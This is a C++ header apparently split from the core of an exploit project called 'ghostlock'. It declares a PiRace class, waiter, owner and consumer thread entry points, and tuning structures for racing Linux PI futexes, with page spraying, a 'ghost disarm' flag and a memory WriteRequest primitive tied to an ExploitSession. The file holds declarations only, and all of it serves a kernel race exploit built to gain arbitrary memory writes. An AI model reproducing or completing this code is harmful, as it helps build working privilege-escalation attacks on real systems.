/**
 * @file race.h
 * @brief 43499 核心的按用途头（由 core.cpp 拆分，声明/内联逐字保留）。
 */
#ifndef GHOSTLOCK_CORE_RACE_H
#define GHOSTLOCK_CORE_RACE_H

#include "route.h"
#include "memory.h"
#include "support.h"

/* ==== race/pi_race.h ==== */
#ifndef PI_RACE_H
#define PI_RACE_H


#include <pthread.h>
#include <atomic>
#include <cstdint>

namespace ghostlock::race {
    /* Owns one PI race attempt: the two PI futexes the waiter walks, the three
     * worker threads and the route outcome. The atomics stay public because the
     * route operations read and write them from their hot loops; this class owns
     * the lifecycle that used to be spread across main.cpp helpers: creation
     * order (consumer -> owner -> waiter), the stop signal and the join order
     * (waiter -> owner -> consumer). */
    class PiRace final {
    public:
        PiRace() noexcept = default;

        PiRace(const PiRace &) = delete;

        PiRace &operator=(const PiRace &) = delete;

        ~PiRace() noexcept = default;

        /* All state returns to its reset value. The fast_repair latch is owned by
         * the caller (reset_main_route_state preserves it across resets). */
        [[nodiscard]] bool reset(uint32_t initial_delay_usec, int32_t main_cpu,
                                 int32_t consumer_cpu) noexcept;

        /* consumer -> owner -> waiter, matching the original creation order. On a
         * partial failure every already-started worker is asked to stop and joined
         * before the pthread_create error is returned. */
        [[nodiscard]] int32_t start_threads(void *(*waiter_entry)(void *),
                                        void *(*owner_entry)(void *),
                                        void *(*consumer_entry)(void *),
                                        const ghostlock::memory::WriteRequest *route_request) noexcept;

        /* Waits for the route to finish and returns its outcome. A route that
         * reports Ok without a consumer call and success has not won the race, so
         * the returned outcome degrades to Retryable, matching the bool the
         * previous free function returned. The wait itself is unbounded today:
         * see TODO(pi-timeout-01). */
        [[nodiscard]] ghostlock::route::RouteStatus run() noexcept;

        /* Business stop signal for the three workers; idempotent. */
        void request_stop() noexcept;

        /* waiter -> owner -> consumer join order; idempotent. */
        [[nodiscard]] int32_t join() noexcept;

        /* Testable counter merge used by run(): Ok with zero calls or zero
         * successes is not a routed attempt. */
        [[nodiscard]] static ghostlock::route::RouteStatus outcome_with_counters(
            const ghostlock::route::RouteStatus &outcome, int32_t calls, int32_t success) noexcept;

        /* C atomics cannot carry initializers in C++; static instances are
         * zero-initialized and every dynamic path calls reset() first.
         * Memory order: the hot-path stores/loads keep the original default
         * (sequentially consistent) semantics and reset() keeps the previous
         * relaxed stores. Do not relax either without a dedicated race gate. */
        uint32_t wait_futex = 0;
        uint32_t target_futex = 0;
        uint32_t chain_futex = 0;
        std::atomic<int32_t> waiter_ready;
        std::atomic<int32_t> waiter_waiting;
        std::atomic<int32_t> owner_started;
        std::atomic<int32_t> owner_chain_done;
        std::atomic<int32_t> owner_stop;
        std::atomic<int32_t> route_done;
        std::atomic<int32_t> waiter_tid;
        std::atomic<int32_t> consumer_go;
        std::atomic<int32_t> consumer_stop;
        std::atomic<int32_t> consumer_calls;
        std::atomic<int32_t> consumer_success;
        std::atomic<int32_t> consumer_inflight;
        std::atomic<uint32_t> route_delay_usec;
        std::atomic<int32_t> fast_repair;
        int32_t main_cpu = 0;
        int32_t consumer_cpu = 0;
        ghostlock::support::PthreadOwner waiter_owner;
        ghostlock::support::PthreadOwner owner_owner;
        ghostlock::support::PthreadOwner consumer_owner;
        const ghostlock::memory::WriteRequest *request = nullptr;
        ghostlock::route::RouteStatus route_status{};

    private:
        [[nodiscard]] int32_t abort_startup() noexcept;
    };
} // namespace ghostlock::race

#endif
/* ==== race/threads.hpp ==== */
#ifndef GHOSTLOCK_ROUTE_THREADS_HPP
#define GHOSTLOCK_ROUTE_THREADS_HPP


namespace ghostlock::core {
    /** @brief 三个线程入口共用的全部参数（一个 `void*` 传入）。 */
    struct ThreadArgs final {
        RouteInputs route;
        RacePointers race;
        std::uint32_t *wait_futex;
        std::uint32_t *target_futex;
        std::uint32_t *chain_futex;
        std::uint32_t poll_us;
        std::uint32_t route_wait_ms;
        std::int32_t ghost_disarm;
        std::uint32_t consumer_burst;
        std::uint32_t consumer_max;
        std::uint32_t consumer_nice;
        std::int32_t consumer_cpu;
        std::int32_t compact_waiter;
        /* 竞态时序 / 优先级调节面：全部来自调用方，目标函数内不写字面量。 */
        std::uint32_t fast_repair_delay_us;     /* fast repair 的 consumer 延迟与 settle */
        std::uint32_t fast_repair_window_ns;    /* fast repair 时 waiter 等待窗口的扩展 */
        std::uint32_t owner_idle_sleep_s;       /* owner 持锁等待 stop 的休眠粒度 */
        std::uint32_t consumer_nice_base;       /* compact waiter 的 nice 起点 */
        std::uint32_t consumer_nice_span;       /* compact waiter 的 nice 回绕跨度（0=不轮转） */
        std::uint32_t consumer_lock_pi_spin_ns; /* sched_setattr 失败后 PI 重试超时 */
        std::uint32_t ghost_disarm_flag;        /* ghost disarm 用的 PI futex 标记位 */
        ghostlock::route::RouteStatus out_status;
        std::int32_t out_fallback;
    };

    /** @brief 一次 PI 竞态运行的全部输入。 */
    struct RaceRunParams final {
        ThreadArgs args;
        std::uint32_t setup_settle_us;
        std::uint32_t route_done_timeout_ms;
        std::uint32_t enter_delay_us;
        std::int32_t main_cpu;
        std::int32_t consumer_cpu;
        std::int32_t preserve_fast_repair;
        /* 页喷射结果；runner 在读页字段前刷新（不要求调用方先刷新）。 */
        const ghostlock::core::PageSprayInputs *spray;
    };
} // namespace ghostlock::core

namespace ghostlock::race {
    /* 6 个 cmp_disasm 目标：只读入参结构，不读全局/类/项目宏。 */
    void *waiter_thread(void *arg);

    void *owner_thread(void *arg);

    void *consumer_thread(void *arg);

    /* Create, synchronize, stop and join one explicitly owned PI race. */
    ghostlock::route::RouteStatus run_main_route_threads(
        ghostlock::core::RaceRunParams &params);

    /* 会话适配器（Kotlin 传参落地后删除）。 */
    /** @brief 用调用方提供的会话构造竞态参数（原子入口用；不读全局）。 */
    ghostlock::core::RaceRunParams race_run_params_for(
        session::ExploitSession &s, const ghostlock::memory::WriteRequest &request,
        const ghostlock::core::PageSprayInputs *spray);

    ghostlock::core::RaceRunParams race_run_params_from_session(
        const ghostlock::memory::WriteRequest &request,
        const ghostlock::core::PageSprayInputs *spray);

    bool run_main_route_threads_from_session(
        const ghostlock::memory::WriteRequest &request);
} // namespace ghostlock::race

#endif

#endif // GHOSTLOCK_CORE_RACE_H
